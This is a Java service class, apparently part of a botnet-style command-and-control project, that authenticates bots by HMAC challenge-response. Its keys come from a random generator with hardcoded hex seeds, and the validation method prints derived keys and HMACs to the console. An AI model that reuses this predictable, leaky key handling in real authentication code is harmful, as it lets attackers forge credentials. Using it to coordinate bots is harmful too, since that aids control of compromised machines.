package cs.sii.bot.action;

import java.util.HashMap;

import javax.crypto.spec.SecretKeySpec;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.domain.Conversions;
import cs.sii.domain.Pairs;
import cs.sii.domain.RWRandom;
import cs.sii.service.crypto.CryptoUtils;

@Service
public class Auth {

	@Autowired
	private CryptoUtils cry;

	private String seedIterationGenerator1;
	private String seedIterationGenerator2;
	private String seedIterationGenerator3;

	private RWRandom rndIt = new RWRandom();
	private RWRandom rndRnd = new RWRandom();

	private HashMap<String, Pairs<Long, Integer>> botSeed = new HashMap<>();

	/**
	 * 
	 */
	public Auth() {
		seedIterationGenerator1 = "5E1CA498";
		seedIterationGenerator2 = "5fffffffffffffdd";
		seedIterationGenerator3 = "644666D8";
		rndIt.setSeed(Integer.parseInt(seedIterationGenerator1, 16));
		rndRnd.setSeed(Long.parseLong(seedIterationGenerator2, 16));
	}

	/**
	 * converte seed in Long
	 * 
	 * @return Long seed
	 */
	@SuppressWarnings("unused")
	private Long convertSeed(String seed) {
		byte[] b = seed.getBytes();
		return Conversions.bytesToLong(b);
	}

	/**
	 * genera un numero per la creazione del secretKey
	 * 
	 * 
	 */
	public Integer generateIterationNumber() {
		return rndIt.nextPosInt(Integer.MAX_VALUE);
	}

	/**
	 * genera un messaggio randomico utilizzato per la fase di hmac
	 */
	public Long generateNumberText() {
		return rndRnd.nextPosLong(Long.MAX_VALUE);
	}

	/**
	 * @param iteration
	 * @return
	 */
	public String generateStringKey(Integer iteration) {
		RWRandom rnd = new RWRandom();
		rnd.setSeed(Integer.parseInt(seedIterationGenerator3, 16));
		while (iteration > 0) {
			rnd.nextPosInt(Integer.MAX_VALUE);
			iteration--;
		}
		return Integer.toString(rnd.nextPosInt(Integer.MAX_VALUE));
	}

	/**
	 * genera la secret key da utilizzare per la funziona di Hmac
	 */
	public SecretKeySpec generateSecretKey(String stringKey) {
		return new SecretKeySpec(stringKey.getBytes(), CryptoUtils.getTypeMac());
	}

	/**
	 * genera un hmac
	 * 
	 * @param hashMac
	 * @return
	 */
	public String generateHmac(Long message, SecretKeySpec secretKey) {
		return cry.generateHmac(message, secretKey);
	}

	/**
	 * valida un hmac generando localmente e verificando con i dati inviati
	 * 
	 * @param hashMac
	 * @return
	 */
	public boolean validateHmac(Long keyNumber, Integer iterationNumber, String hashMac) {
		System.out.println("hamca" + keyNumber + "   it  " + iterationNumber + " string hmac  " + hashMac);
		String stringKey = generateStringKey(iterationNumber);
		System.out.println("string " + stringKey);
		SecretKeySpec secretKey = generateSecretKey(stringKey);
		System.out.println("sck  " + secretKey);
		if (cry.generateHmac(keyNumber, secretKey).equals(hashMac)) {
			return true;
		} else {
			return false;
		}
	}

	/**
	 * @param idBot
	 * @param key
	 * @param value
	 */
	public void addBotChallengeInfo(String idBot, Long key, Integer value) {
		Pairs<Long, Integer> cs = new Pairs<>();
		cs.setValue1(key);
		cs.setValue2(value);
		botSeed.put(idBot, cs);
	}

	/**
	 * @param idBot
	 * @return
	 */
	public boolean findBotChallengeInfo(String idBot) {
		// IP ip=new IP(ips);
		if (botSeed.get(idBot) != null)
			return true;
		return false;
	}

	/**
	 * @return
	 */
	public HashMap<String, Pairs<Long, Integer>> getBotSeed() {
		return botSeed;
	}

}
